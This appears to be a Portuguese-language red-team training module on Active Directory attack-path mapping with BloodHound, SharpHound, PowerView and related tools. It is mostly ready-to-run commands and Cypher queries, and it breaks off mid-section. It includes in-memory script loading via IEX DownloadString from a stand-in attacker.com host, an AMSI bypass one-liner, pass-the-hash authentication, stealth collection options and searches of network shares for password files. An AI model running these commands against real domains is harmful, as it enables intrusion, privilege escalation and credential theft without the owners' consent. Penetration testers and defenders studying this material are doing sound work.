---
title: "BloodHound & AD Enumeration"
---

# BloodHound e Enumeração de Active Directory

## AD Como Grafo de Ataque

Em Active Directory, a diferença entre operador que fica horas escalando privilégio sem sucesso e operador que encontra o caminho crítico em minutos resume a uma coisa: **visualização de grafo de ataque**. BloodHound resolve exatamente esse problema. AD é grafo: usuários, grupos e computadores são nós; relações (member of, admin local de, tem sessão em, delegação configurada pra, pode resetar senha de) são as arestas. Atacante que compreende o grafo percorre caminhos que nenhum administrador enxergou — porque AD é complexo demais pra análise manual.

BloodHound usa teoria de grafos pra responder perguntas que seriam impossíveis manualmente: quem pode se tornar Domain Admin (mesmo sem ser DA agora)? Qual conta com senha fraca tem admin local no servidor onde um Domain Admin tem sessão ativa? Qual o caminho mais curto de qualquer usuário comprometido até o alvo?

Além do BloodHound, este módulo cobre o arsenal completo de enumeração de AD: SharpHound (coletor que alimenta BloodHound), PowerView (enumeração LDAP via PowerShell, mais cirúrgica e menos barulhenta), ldapdomaindump (dump rápido em HTML navegável), enum4linux-ng (info básica via SMB/RPC). MITRE ATT&CK: T1069 (Permission Groups Discovery), T1087 (Account Discovery), T1482 (Domain Trust Discovery), T1018 (Remote System Discovery), T1033 (System Owner/User Discovery).

---

## Arquitetura, Cypher e Ingestion

### Arquitetura do BloodHound

O BloodHound é composto por três componentes:

1. **SharpHound / bloodhound-python** — o coletor (ingestor):
   - Conecta ao Active Directory via LDAP para coletar objetos (usuários, grupos, computadores, GPOs, OUs, containers, trusts, ADCS)
   - Consulta hosts individuais via RPC/SMB para sessões ativas e administradores locais
   - Exporta dados como arquivos JSON compactados em ZIP

2. **Neo4j** — banco de dados de grafo:
   - Armazena nós (usuários, grupos, computadores, domínios) e arestas (relações)
   - Usa a linguagem de query Cypher para traversal de grafos
   - BloodHound CE usa PostgreSQL moderno, mas BloodHound 4.x ainda usa Neo4j

3. **BloodHound GUI** — interface de visualização:
   - Carrega dados do Neo4j/PostgreSQL
   - Exibe grafos de ataque interativos
   - Tem queries pré-definidas e aceita queries Cypher customizadas

### Como o SharpHound Coleta Dados

**Via LDAP** (contra o DC — silencioso em termos de tráfego nos hosts):
- Enumeração de todos os objetos: usuários, grupos, computadores, GPOs, OUs, domínios
- Leitura de atributos: SPN, UAC flags, delegação, adminCount, ACLs
- Memberships de grupos (incluindo grupos aninhados)
- Trusts entre domínios
- Configurações de ADCS (Active Directory Certificate Services)

**Via RPC/SMB** (contra todos os computadores — barulhento):
- Sessões ativas: `NetSessionEnum` — quem está logado em quais computadores
- Administradores locais: `NetLocalGroupGetMembers` — quem é admin local em cada máquina
- Usuários logados: `NetWkstaUserEnum` — usuários ativos na workstation
- Esses acessos criam logs de autenticação em cada host visitado

### Edges (Arestas) Importantes no BloodHound

```
MemberOf         → Membro de grupo (direto ou transitivo)
AdminTo          → Administrador local em computador
HasSession       → Usuário tem sessão ativa naquele computador
CanRDP           → Pode conectar via RDP
CanPSRemote      → Pode usar PowerShell Remoting (WinRM)
ExecuteDCOM      → Pode executar via DCOM
GenericAll       → Controle total sobre o objeto
GenericWrite     → Pode escrever atributos arbitrários
WriteOwner       → Pode mudar o dono do objeto (dono tem controle)
WriteDACL        → Pode modificar a ACL do objeto
ForceChangePassword → Pode redefinir a senha sem saber a atual
AddMember        → Pode adicionar membros ao grupo
Owns             → É o dono do objeto
DCSync           → Tem permissões de replicação (DS-Replication)
GetChanges       → DS-Replication-Get-Changes
GetChangesAll    → DS-Replication-Get-Changes-All
AllowedToDelegate → Delegação configurada (KCD)
AllowedToAct     → Resource-Based Constrained Delegation
TrustedBy        → Trust de domínio
```

---

## Na Prática

### Estratégia de Coleta — Quando Usar Cada Método

**DCOnly (mais furtivo)**:
- Coleta apenas via LDAP no DC
- Não toca outros hosts — sem logs nos endpoints
- Perde: sessões ativas, administradores locais (via RPC)
- Quando usar: quando OPSEC é crítico, em engagements onde IDS monitora lateralização

**All (mais completo)**:
- Inclui DCOnly + consultas RPC/SMB em todos os computadores
- Gera tráfego de rede para cada host e logs de autenticação
- Quando usar: em labs, engagements sem restrição de ruído, quando sessões ativas são essenciais

**Session (apenas sessões)**:
- Foca em descobrir onde Domain Admins têm sessão ativa
- Útil para encontrar oportunidade de credential theft

**Hybrid (prático)**:
1. Começar com DCOnly para mapeamento base
2. Identificar servidores de alto valor (DCs, servidores de aplicação, jump servers)
3. Executar coleta de sessões apenas nesses alvos específicos

---

## Exemplos de Código / Comandos

### Setup — Instalação e Configuração

```bash
# ================================================================
# BloodHound CE (versão moderna — Docker)
# Recomendado para novos labs

git clone https://github.com/SpecterOps/BloodHound.git
cd BloodHound
cp examples/docker-compose/docker-compose.yml docker-compose.yml

# Iniciar (PostgreSQL + BloodHound API + GUI)
docker compose up -d

# Acesso: http://localhost:8080
# Login inicial: admin / SenhaNaConsole (ver output do docker compose)

# ================================================================
# BloodHound Legacy (4.x — Neo4j)
# Ainda muito usado em ambientes reais e CTFs

# Ubuntu/Kali
sudo apt update && sudo apt install -y neo4j bloodhound

# Iniciar Neo4j
sudo neo4j start
# Aguardar serviço subir...

# Configurar senha inicial (primeira execução)
# Acessar http://localhost:7474
# Login: neo4j / neo4j
# Trocar para senha escolhida (ex: bloodhound123)

# Iniciar BloodHound GUI
bloodhound &
# Ou:
/usr/bin/bloodhound --no-sandbox &

# Na GUI:
# Database URL: bolt://localhost:7687
# Username: neo4j
# Password: [senha configurada acima]

# ================================================================
# Configurar Neo4j para performance (queries grandes)
# Editar /etc/neo4j/neo4j.conf

# Aumentar heap para queries pesadas
dbms.memory.heap.initial_size=1G
dbms.memory.heap.max_size=4G
dbms.memory.pagecache.size=2G

sudo systemctl restart neo4j
```

---

### SharpHound — Coleta no Windows

```powershell
# ================================================================
# Download e execução básica

# Verificar versão
SharpHound.exe --version

# ================================================================
# COLETA COMPLETA (All) — recomendado para labs, barulhento em prod
SharpHound.exe \
    --CollectionMethods All \
    --Domain corp.local \
    --ZipFileName corp_bloodhound_$(Get-Date -Format yyyyMMdd).zip \
    --OutputDirectory C:\temp

# ================================================================
# COLETA FURTIVA (DCOnly) — apenas LDAP no DC, sem tocar outros hosts
SharpHound.exe \
    --CollectionMethods DCOnly \
    --Domain corp.local \
    --ZipFileName corp_dconly.zip \
    --OutputDirectory C:\temp \
    --RandomizeFilenames \          # Nomes aleatórios nos JSON de saída
    --EncryptZip                    # Zipar com senha

# ================================================================
# COLETA DE SESSÕES — para encontrar onde DAs têm sessão
SharpHound.exe \
    --CollectionMethods Session \
    --Domain corp.local \
    --ZipFileName sessions.zip \
    --Loop \                        # Coleta em loop (captura sessões transientes)
    --LoopDuration 02:00:00 \       # Durar 2 horas
    --LoopInterval 00:05:00         # A cada 5 minutos

# ================================================================
# COLETA DE ADCS (Active Directory Certificate Services)
SharpHound.exe \
    --CollectionMethods CertServices \
    --Domain corp.local \
    --ZipFileName adcs.zip

# ================================================================
# COLETA COM CREDENCIAIS ALTERNATIVAS
SharpHound.exe \
    --CollectionMethods All \
    --Domain corp.local \
    --LdapUsername 'svc_enum' \
    --LdapPassword 'Senha123' \
    --DomainController DC01.corp.local \
    --ZipFileName output.zip

# ================================================================
# COLETA COM LDAPS (porta 636 — mais seguro, menos detectável)
SharpHound.exe \
    --CollectionMethods All \
    --Domain corp.local \
    --SecureLdap \
    --ZipFileName output_ldaps.zip

# ================================================================
# COLETA EVITANDO LISTA DE COMPUTADORES (stealth em hosts específicos)
# Criar lista de computadores a EXCLUIR
"SENSITIVE-SERVER01","SENSITIVE-SERVER02" | Out-File C:\temp\exclude_hosts.txt

SharpHound.exe \
    --CollectionMethods All \
    --ExcludeDomainControllers \    # Excluir DCs da coleta de sessões (reduz ruído)
    --ComputerFile C:\temp\targets.txt \  # Ou especificar apenas alvos
    --ZipFileName targeted.zip

# ================================================================
# COLETA EM LOOP (capturar sessões transientes)
SharpHound.exe \
    --CollectionMethods Session,LoggedOn \
    --Loop \
    --LoopDuration 04:00:00 \
    --LoopInterval 00:15:00 \
    --ZipFileName sessions_loop.zip

# ================================================================
# Em memória via PowerShell (sem escrita de executável em disco)
# Carregar SharpHound como módulo PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/SharpHound.ps1')
Invoke-BloodHound -CollectionMethods All -Domain corp.local -ZipFileName output.zip

# Alternativa com Invoke-BloodHound (PowerSploit versão)
Import-Module C:\temp\SharpHound.ps1
Invoke-BloodHound -CollectionMethods DCOnly -OutputDirectory C:\temp

# ================================================================
# MÉTODOS DE COLETA — referência completa
# All                → Todos os métodos (Group+LocalAdmin+RDP+DCOM+PSRemote+Session+LoggedOn+Trusts+ACL+ObjectProps+Container+CertServices+SPNTargets)
# DCOnly             → Group+Trusts+ACL+ObjectProps+Container+GPOLocalGroup (apenas LDAP no DC)
# Group              → Memberships de grupos
# LocalAdmin         → Administradores locais em computadores (RPC)
# RDP                → Quem pode RDP em computadores (via GPO)
# DCOM               → Quem pode DCOM
# PSRemote           → Quem pode PSRemote
# Session            → Sessões ativas via NetSessionEnum
# LoggedOn           → Usuários logados via NetWkstaUserEnum (requer admin)
# Trusts             → Domain trusts
# ACL                → ACLs (edges GenericAll, WriteDACL, etc.)
# ObjectProps        → Propriedades de objetos (hasSPN, dontReqPreAuth, etc.)
# Container          → Container/OU structure
# GPOLocalGroup      → Admin local via GPO
# SPNTargets         → Alvos de SPN para Kerberoasting
# CertServices       → ADCS templates e CAs
# UserRights         → Direitos de usuário (SeBackupPrivilege, etc.)
```

---

### bloodhound-python — Coleta no Linux

```bash
# Instalação
pip3 install bloodhound
# Ou
pip3 install bloodhound-ce  # Versão para BloodHound CE

# ================================================================
# Coleta completa
bloodhound-python \
    -u usuario \
    -p 'Senha123' \
    -d corp.local \
    --dc DC01.corp.local \
    -c All \
    --zip \
    -o /tmp/bloodhound_output/

# ================================================================
# Coleta DCOnly (apenas LDAP)
bloodhound-python \
    -u usuario \
    -p 'Senha123' \
    -d corp.local \
    --dc DC01.corp.local \
    -c DCOnly \
    --zip

# ================================================================
# Com hash NT (Pass-the-Hash)
bloodhound-python \
    -u Administrator \
    --hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
    -d corp.local \
    --dc DC01.corp.local \
    -c All \
    --zip

# ================================================================
# Com ticket Kerberos
export KRB5CCNAME=/tmp/Administrator.ccache
bloodhound-python \
    -k \
    --no-pass \
    -d corp.local \
    --dc DC01.corp.local \
    -c All \
    --zip

# ================================================================
# Especificando nameserver (útil quando DNS não está configurado)
bloodhound-python \
    -u usuario \
    -p 'Senha123' \
    -d corp.local \
    --dc 192.168.1.10 \
    -ns 192.168.1.10 \
    -c All \
    --zip

# ================================================================
# Coleta de ADCS
bloodhound-python \
    -u usuario \
    -p 'Senha123' \
    -d corp.local \
    --dc DC01.corp.local \
    -c CertServices \
    --zip
```

---

### Carregar Dados no BloodHound

```bash
# BloodHound GUI — arrastar e soltar o ZIP na interface
# Ou:

# BloodHound CE — via API
curl -s -X POST \
    -H "Content-Type: multipart/form-data" \
    -F "file=@/tmp/corp_bloodhound.zip" \
    -H "Authorization: Bearer $TOKEN" \
    http://localhost:8080/api/v2/file-upload

# BloodHound Legacy — upload manual na GUI
# Clicar "Upload Data" → selecionar ZIP ou arquivos JSON individuais

# Neo4j — verificar dados carregados
# Na GUI do Neo4j (http://localhost:7474):
MATCH (n) RETURN count(n) AS total_nodes
MATCH ()-[r]->() RETURN count(r) AS total_edges
MATCH (u:User) RETURN count(u) AS usuarios
MATCH (c:Computer) RETURN count(c) AS computadores
MATCH (g:Group) RETURN count(g) AS grupos
```

---

### Queries Cypher Essenciais

```cypher
-- ================================================================
-- ORIENTAÇÃO INICIAL — Queries de visão geral

-- Contar objetos no grafo
MATCH (n) RETURN labels(n)[0] AS tipo, count(n) AS quantidade
ORDER BY quantidade DESC

-- Listar todos os domínios
MATCH (d:Domain) RETURN d.name, d.functionallevel, d.distinguishedname

-- ================================================================
-- CAMINHOS PARA DOMAIN ADMINS

-- Caminho mais curto de qualquer usuário ativo para Domain Admins
MATCH p=shortestPath(
    (u:User {enabled:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p LIMIT 25

-- Caminho mais curto de usuário específico
MATCH p=shortestPath(
    (u:User {name:"JOAO@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p

-- Todos os caminhos (não apenas o mais curto) — cuidado, pode ser lento
MATCH p=allShortestPaths(
    (u:User {enabled:true})-[*1..10]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
WHERE NOT u.name STARTS WITH "ADMIN"
RETURN p LIMIT 15

-- Usuários não-admin com caminho para DA em até 5 hops
MATCH p=(u:User {enabled:true})-[*1..5]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
WHERE NOT (u)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN u.name, length(p) AS hops
ORDER BY hops ASC
LIMIT 20

-- ================================================================
-- KERBEROASTING E AS-REP ROASTING

-- Todos os usuários Kerberoastable ativos
MATCH (u:User {hasspn:true, enabled:true})
RETURN u.name, u.serviceprincipalnames, u.pwdlastset
ORDER BY u.pwdlastset ASC  -- Senhas mais antigas primeiro

-- Kerberoastable com caminho para DA
MATCH p=shortestPath(
    (u:User {hasspn:true, enabled:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN u.name, u.serviceprincipalnames, length(p) AS hops
ORDER BY hops ASC

-- Kerberoastable que são admins locais em algum computador
MATCH (u:User {hasspn:true, enabled:true})-[:AdminTo]->(c:Computer)
RETURN u.name, u.serviceprincipalnames, c.name

-- Usuários AS-REP Roastable
MATCH (u:User {dontreqpreauth:true, enabled:true})
RETURN u.name, u.pwdlastset
ORDER BY u.pwdlastset ASC

-- ================================================================
-- DELEGAÇÃO KERBEROS

-- Computadores com Unconstrained Delegation (excluindo DCs)
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.primarygroupid = "516"    -- 516 = Domain Controllers group RID
  AND NOT c.primarygroupid = "521"    -- 521 = Read-Only Domain Controllers
RETURN c.name, c.operatingsystem, c.unconstraineddelegation

-- Computadores com Constrained Delegation (KCD)
MATCH (c:Computer)
WHERE c.allowedtodelegate IS NOT NULL
RETURN c.name, c.allowedtodelegate
ORDER BY c.name

-- Usuários com Constrained Delegation
MATCH (u:User {enabled:true})
WHERE u.allowedtodelegate IS NOT NULL
RETURN u.name, u.allowedtodelegate
ORDER BY u.name

-- Computadores com Resource-Based Constrained Delegation (RBCD)
MATCH (c:Computer)-[:AllowedToAct]->(target:Computer)
RETURN c.name AS delegatee, target.name AS target_computer

-- ================================================================
-- SESSÕES ATIVAS (onde Domain Admins estão logados)

-- Onde membros de Domain Admins têm sessão ativa
MATCH p=(m:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
      (m)-[:HasSession]->(c:Computer)
RETURN m.name AS da_user, c.name AS computer
ORDER BY c.name

-- Todos os computadores com sessões de usuários privilegiados
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "ADMIN"
WITH u
MATCH (u)-[:HasSession]->(c:Computer)
RETURN u.name, g.name, c.name

-- Computadores onde há sessão de DA E onde usuário comprometido tem admin
MATCH (da:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
MATCH (da)-[:HasSession]->(c:Computer)
MATCH (comprometido:User {enabled:true})-[:AdminTo]->(c)
WHERE NOT (comprometido)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN comprometido.name AS atacante, c.name AS servidor, da.name AS da_sessao

-- ================================================================
-- ACLs ABUSÁVEIS

-- Quem tem GenericAll sobre Domain Admins
MATCH p=(n)-[:GenericAll]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN n.name, type(n), p

-- Quem tem WriteDACL sobre objeto crítico
MATCH p=(n)-[:WriteDACL]->(t)
WHERE t.name CONTAINS "ADMIN" OR t.name CONTAINS "DOMAIN" OR t.name CONTAINS "DC"
RETURN n.name, type(n), t.name, type(t)
LIMIT 20

-- Quem pode redefinir senha de DA
MATCH (da:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
MATCH p=(n)-[:ForceChangePassword]->(da)
RETURN n.name, da.name

-- Contas com GenericWrite sobre alguma conta com SPN (Targeted Kerberoasting)
MATCH (u:User {enabled:true})-[:GenericWrite]->(target:User {hasspn:true})
RETURN u.name AS atacante, target.name AS alvo_kerberoast

-- Todos os edges perigosos a partir de um usuário específico
MATCH p=(u:User {name:"JOAO@CORP.LOCAL"})-[r]->(t)
WHERE type(r) IN ['GenericAll','GenericWrite','WriteOwner','WriteDACL',
                   'ForceChangePassword','AddMember','AdminTo','CanRDP',
                   'ExecuteDCOM','AllowedToDelegate','DCSync']
RETURN p

-- ================================================================
-- DCSYNC

-- Quem pode fazer DCSync
MATCH p=(n)-[:DCSync|GetChanges|GetChangesAll|GetChangesInFilteredSet]->(d:Domain)
RETURN n.name, type(n), [r IN relationships(p) | type(r)] AS direitos
ORDER BY n.name

-- ================================================================
-- ADMINISTRADORES LOCAIS

-- Computadores onde usuário não-DA tem admin local
MATCH p=(u:User {enabled:true})-[:AdminTo]->(c:Computer)
WHERE NOT (u)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN u.name, c.name
LIMIT 30

-- Usuários com mais admin local (alvos valiosos para comprometimento)
MATCH (u:User {enabled:true})-[:AdminTo]->(c:Computer)
WHERE NOT (u)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN u.name, count(c) AS num_computers
ORDER BY num_computers DESC
LIMIT 20

-- ================================================================
-- TRUSTS ENTRE DOMÍNIOS

-- Todos os trusts de domínio
MATCH p=(d1:Domain)-[r:TrustedBy|Contains]->(d2:Domain)
RETURN d1.name, type(r), d2.name

-- Usuários de um domínio com caminho para DA de outro domínio (cross-domain)
MATCH p=shortestPath(
    (u:User {domain:"CHILD.CORP.LOCAL", enabled:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p LIMIT 10

-- ================================================================
-- GPOs

-- GPOs que se aplicam a computadores sensíveis (DCs)
MATCH (g:GPO)-[:GPLink]->(ou:OU)-[:Contains*1..]->(c:Computer {primarygroupid:"516"})
RETURN g.name, ou.name, c.name

-- Quem pode modificar GPOs
MATCH p=(u:User {enabled:true})-[:GenericAll|GenericWrite|WriteOwner|WriteDACL]->(g:GPO)
RETURN u.name, g.name, g.gpcpath

-- ================================================================
-- QUERIES DE ANÁLISE DE IMPACTO

-- Contas de alto valor (membros de grupos privilegiados)
MATCH (u:User {enabled:true})-[:MemberOf*1..]->(g:Group)
WHERE g.name IN ["DOMAIN ADMINS@CORP.LOCAL","ENTERPRISE ADMINS@CORP.LOCAL",
                  "SCHEMA ADMINS@CORP.LOCAL","BACKUP OPERATORS@CORP.LOCAL",
                  "ACCOUNT OPERATORS@CORP.LOCAL","SERVER OPERATORS@CORP.LOCAL"]
RETURN u.name, collect(g.name) AS grupos
ORDER BY u.name

-- Computadores com SO desatualizado (Windows 7, 2008, etc.)
MATCH (c:Computer {enabled:true})
WHERE c.operatingsystem CONTAINS "Windows 7"
   OR c.operatingsystem CONTAINS "2008"
   OR c.operatingsystem CONTAINS "2003"
   OR c.operatingsystem CONTAINS "XP"
RETURN c.name, c.operatingsystem
ORDER BY c.operatingsystem

-- Usuários com senha que não expira
MATCH (u:User {enabled:true, pwdneverexpires:true})
WHERE NOT u.name STARTS WITH "KRBTGT"
RETURN u.name, u.pwdlastset, u.description
ORDER BY u.pwdlastset ASC  -- Mais antigas primeiro

-- Usuários que nunca fizeram login (potenciais contas de backdoor ou teste)
MATCH (u:User {enabled:true})
WHERE u.lastlogon = -1.0 OR u.lastlogon IS NULL
RETURN u.name, u.whencreated, u.description
ORDER BY u.whencreated DESC
```

---

### PowerView — Enumeração Completa

```powershell
# ================================================================
# Carregar PowerView

# Método 1: Arquivo local
Import-Module .\PowerView.ps1

# Método 2: Em memória (sem escrita em disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1')

# Método 3: Com bypass de AMSI + em memória
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1')

# ================================================================
# INFORMAÇÕES DO DOMÍNIO

# Info básica do domínio
Get-Domain
Get-DomainController
Get-DomainController -Domain corp.local | Select-Object Name, IPAddress, OSVersion

# Forest info
Get-Forest
Get-ForestDomain
Get-ForestTrust

# Trusts
Get-DomainTrust
Get-DomainTrust -Domain corp.local

# ================================================================
# USUÁRIOS

# Todos os usuários
Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon,memberof,description

# Usuários com SPN (Kerberoastable)
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,memberof |
    Sort-Object pwdlastset

# Usuários sem pré-autenticação (AS-REP Roastable)
Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol

# Usuários com descrição contendo senha (erro comum de admins)
Get-DomainUser -Properties samaccountname,description |
    Where-Object { $_.description -match "pass|pwd|senha|secret|123|admin" }

# Usuários com adminCount=1 (processados pelo SDProp)
Get-DomainUser -AdminCount -Properties samaccountname,memberof,pwdlastset

# Usuários desabilitados
Get-DomainUser -UACFilter ACCOUNTDISABLE -Properties samaccountname

# Usuários com senha que nunca expira
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD -Properties samaccountname,pwdlastset

# Usuários criados nos últimos 30 dias (nova backdoor?)
$30dias = (Get-Date).AddDays(-30)
Get-DomainUser -Properties samaccountname,whencreated |
    Where-Object { $_.whencreated -gt $30dias }

# ================================================================
# GRUPOS

# Membros de Domain Admins (recursivo — inclui aninhados)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse |
    Select-Object GroupName, MemberName, MemberObjectClass

# Grupos que contêm usuários de outros domínios (cross-domain membership)
Get-DomainForeignGroupMember

# ================================================================
# COMPUTADORES

# Todos os computadores com versão de SO
Get-DomainComputer -Properties dnshostname,operatingsystem,operatingsystemversion |
    Sort-Object operatingsystem

# Computadores com Unconstrained Delegation (excluindo DCs)
Get-DomainComputer -Unconstrained -Properties dnshostname,unconstraineddelegation |
    Where-Object { $_.dnshostname -notmatch "DC" }

# Computadores com Constrained Delegation (KCD)
Get-DomainComputer -TrustedToAuth -Properties dnshostname,msds-allowedtodelegateto

# Computadores ativos (fizeram login nos últimos 90 dias)
$90dias = (Get-Date).AddDays(-90)
Get-DomainComputer -Properties dnshostname,lastlogontimestamp |
    Where-Object { [DateTime]::FromFileTime($_.lastlogontimestamp) -gt $90dias }

# ================================================================
# ACLs INTERESSANTES

# ACLs sobre objetos de usuário e grupo que podem ser abusadas
Find-InterestingDomainAcl -ResolveGUIDs |
    Where-Object {
        $_.IdentityReferenceName -ne "Domain Admins" -and
        $_.IdentityReferenceName -ne "Enterprise Admins" -and
        $_.IdentityReferenceName -ne "SYSTEM" -and
        $_.IdentityReferenceName -ne "Administrators" -and
        $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDACL|WriteOwner|ForceChangePassword"
    } |
    Select-Object ObjectDN, IdentityReferenceName, ActiveDirectoryRights, ObjectAceType

# ACLs sobre o objeto raiz do domínio (DCSync rights)
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match "DS-Replication" } |
    Select-Object SecurityIdentifier, ObjectAceType

# ACL do AdminSDHolder
Get-DomainObjectAcl \
    -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    -ResolveGUIDs |
    Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner" } |
    Select-Object SecurityIdentifier, ActiveDirectoryRights

# ================================================================
# ADMIN LOCAL

# Encontrar onde o usuário atual tem admin local
Find-LocalAdminAccess -Verbose
# AVISO: muito barulhento — conecta via SMB em todos os computadores

# Admin local em host específico
Get-NetLocalGroupMember -ComputerName servidor01.corp.local -GroupName "Administrators"

# ================================================================
# SESSÕES ATIVAS

# Sessões ativas em computador específico
Get-NetSession -ComputerName DC01.corp.local

# Usuários logados em computador (requer admin)
Get-NetLoggedon -ComputerName servidor01.corp.local

# Sessões de usuário específico em toda a rede (barulhento)
$sessions = Get-DomainComputer | Get-NetSession
$sessions | Where-Object { $_.UserName -match "admin" }

# ================================================================
# GPOs

# Listar GPOs com path de arquivo
Get-DomainGPO -Properties DisplayName,gpcfilesyspath |
    Sort-Object DisplayName

# GPOs que contêm configurações de Admin Local
Get-DomainGPOLocalGroup |
    Select-Object GPODisplayName, GroupName, GroupMemberOf, GroupMembers

# GPOs aplicadas a um computador específico
Get-DomainGPO -ComputerName workstation01.corp.local

# ================================================================
# SHARES DE REDE

# Encontrar shares em toda a rede
Find-DomainShare -Verbose

# Shares com acesso não-padrão (gravável por todos)
Find-DomainShare -CheckShareAccess |
    Where-Object { $_.Readable -eq $true }

# Encontrar arquivos interessantes em shares
Find-InterestingDomainShareFile -Include "*.txt","*.ini","*.config","*.xml","*.ps1"
Find-InterestingDomainShareFile -Include "*password*","*credential*","*secret*"

# ================================================================
# LATERAL MOVEMENT PATHS

# Computadores onde o usuário atual tem sessão ativa
Get-NetLoggedon | Where-Object { $_.UserName -match $env:USERNAME }

# Encontrar caminhos de lateral movement
# (usuário tem admin local em computador que tem sessão de DA)
$local_admin = Find-LocalAdminAccess
$das = Get-DomainGroupMember "Domain Admins" -Recurse | Select-Object -ExpandProperty MemberName

foreach ($computer in $local_admin) {
    $sessions = Get-NetSession -ComputerName $computer
    foreach ($session in $sessions) {
        if ($das -contains $session.UserName.Split('\')[1]) {
            Write-Host "[!] DA $($session.UserName) tem sessão em $computer onde você tem admin!" -ForegroundColor Red
        }
    }
}
```

---

### ldapdomaindump — Dump Rápido em HTML

```bash
# Instalação
pip3 install ldapdomaindump

# ================================================================
# Dump completo — gera HTML interativos
ldapdomaindump \
    -u 'corp.local\usuario' \
    -p 'Senha123' \
    192.168.1.10 \
    -o /tmp/ldap_dump/

# Arquivos gerados:
# domain_computers.html      — todos os computadores com SO, status
# domain_computers_by_os.html — computadores agrupados por SO
# domain_groups.html         — grupos com membros
# domain_policy.html         — políticas de senha e conta
# domain_trusts.html         — trusts entre domínios
# domain_users.html          — todos os usuários
# domain_users_by_group.html — usuários por grupo
# Versões .json de cada arquivo acima

# ================================================================
# Com hash NT
ldapdomaindump \
    -u 'corp.local\Administrator' \
    --authtype NTLM \
    -p 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' \
    192.168.1.10 \
    -o /tmp/ldap_dump/

# ================================================================
# Usar output para análise rápida (sem abrir browser)
# Usuários com descrição contendo senha
python3 -c "
import json
with open('/tmp/ldap_dump/domain_users.json') as f:
    users = json.load(f)
for user in users:
    desc = str(user.get('description', ''))
    if any(x in desc.lower() for x in ['pass', 'pwd', 'senha', 'secret']):
        print(f\"[!] {user['sAMAccountName']}: {desc}\")
"

# Usuários com senha que nunca expira
python3 -c "
import json
with open('/tmp/ldap_dump/domain_users.json') as f:
    users = json.load(f)
for user in users:
    uac = user.get('userAccountControl', [0])
    if isinstance(uac, list): uac = uac[0]
    if int(uac) & 65536:  # DONT_EXPIRE_PASSWORD
        print(f\"{user['sAMAccountName']} - senha nunca expira\")
"

# Servir HTML via HTTP para visualização
cd /tmp/ldap_dump && python3 -m http.server 8888
# Acessar http://localhost:8888/domain_users.html
```

---

### enum4linux-ng — Enumeração SMB/RPC

```bash
# Instalação
git clone https://github.com/cddmp/enum4linux-ng.git
pip3 install -r enum4linux-ng/requirements.txt

# ================================================================
# Enumeração completa autenticada
python3 enum4linux-ng/enum4linux-ng.py \
    -A \
    -u usuario \
    -p 'Senha123' \
    192.168.1.10

# ================================================================
# Enumeração anônima (sem credenciais)
python3 enum4linux-ng/enum4linux-ng.py -A 192.168.1.10

# ================================================================
# Módulos específicos:
# -U: Usuários
# -G: Grupos
# -S: Shares
# -P: Password policy
# -R: RID cycling (bruteforce de RIDs para descobrir usuários)
# -A: Todos os acima

python3 enum4linux-ng/enum4linux-ng.py -U -G 192.168.1.10

# ================================================================
# Saída em formato JSON
python3 enum4linux-ng/enum4linux-ng.py \
    -A \
    -u usuario \
    -p 'Senha123' \
    192.168.1.10 \
    -oJ /tmp/enum4linux_output.json

# Saída em YAML
python3 enum4linux-ng/enum4linux-ng.py \
    -A \
    -u usuario \
    -p 'Senha123' \
    192.168.1.10 \
    -oY /tmp/enum4linux_output.yaml

# ================================================================
# Informações obtidas:
# - Política de senhas (tamanho mínimo, lockout, complexidade)
# - Lista de usuários via RPC
# - Lista de grupos locais
# - Shares disponíveis
# - Versão do sistema operacional
# - Informações do domínio
# - Sessões ativas (anonymous)
```

---

### Outras Ferramentas de Enumeração

```bash
# ================================================================
# CrackMapExec — enumeração e verificação rápida

# Verificar acesso em range de IPs
crackmapexec smb 192.168.1.0/24 -u usuario -p 'Senha123'

# Enumerar usuários via SMB
crackmapexec smb DC01.corp.local -u usuario -p 'Senha123' --users

# Enumerar grupos
crackmapexec smb DC01.corp.local -u usuario -p 'Senha123' --groups

# Política de senhas
crackmapexec smb DC01.corp.local -u usuario -p 'Senha123' --pass-pol

# Shares
crackmapexec smb 192.168.1.0/24 -u usuario -p 'Senha123' --shares

# Sessões ativas
